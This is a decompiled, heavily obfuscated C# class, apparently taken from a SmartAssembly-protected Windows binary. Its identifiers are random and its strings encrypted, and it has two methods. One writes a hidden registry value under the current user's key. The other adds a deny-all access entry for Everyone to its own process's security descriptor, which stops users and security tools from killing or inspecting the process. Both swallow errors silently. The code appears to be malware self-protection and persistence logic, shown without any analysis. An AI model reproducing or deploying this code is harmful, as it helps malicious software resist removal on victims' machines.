using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace oXSOOyVgTNm;

internal sealed class jTgzCArmINf
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr DRUfaZMdRjP, int sojTKwTNil, [Out] byte[] EJAAfwxVzLv, uint BITpkGpeNcb, out uint aeFmFmChtwbPy);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr YdDeCTROLTepsOORk, int NsgjvFfOJWMmJ, [In] byte[] SiRAGVvrFAiaZw);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void BrLgMJiobgL(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107401481)));
			registryKey.SetValue(NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107401888)), getString_0(107402854));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor eIJURqJQZzWuuXxI(IntPtr intptr_0)
	{
		byte[] eJAAfwxVzLv = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, eJAAfwxVzLv, 0u, out var aeFmFmChtwbPy);
		if ((long)aeFmFmChtwbPy > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, eJAAfwxVzLv = new byte[aeFmFmChtwbPy], aeFmFmChtwbPy, out aeFmFmChtwbPy))
		{
			return null;
		}
		return new RawSecurityDescriptor(eJAAfwxVzLv, 0);
	}

	private void aegqQIOVtdv(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void gGGwGcRhcuAs()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = eIJURqJQZzWuuXxI(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			aegqQIOVtdv(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static jTgzCArmINf()
	{
		Strings.CreateGetStringDelegate(typeof(jTgzCArmINf));
	}
}
